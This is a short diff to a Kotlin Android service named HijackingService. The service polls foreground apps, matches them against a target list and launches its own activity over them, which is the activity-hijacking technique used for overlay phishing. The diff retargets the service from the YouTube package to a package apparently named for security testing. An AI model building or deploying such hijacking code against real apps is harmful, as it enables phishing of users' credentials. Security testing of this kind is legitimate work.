@@ -9,7 +9,7 @@ import java.util.*
 import kotlin.concurrent.timerTask
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-const val U_WANT_TO_HIJACK = "com.google.android.youtube"
+const val U_WANT_TO_HIJACK = "com.csair.soc.test"
 const val HIJACK_ONLY_ONE = false
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -22,8 +22,7 @@ class HijackingService : Service() {
     private var isStart = false
 
     private val task = timerTask {
-
-        AndroidProcesses.getRunningForegroundApps(baseContext)
+        AndroidProcesses.getRunningForegroundApps(this@HijackingService)
                 .asSequence()
                 .filter { sadStories.containsKey(it.packageName) }
                 .forEach {
@@ -66,6 +65,5 @@ class HijackingService : Service() {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
     }
-
 
 }
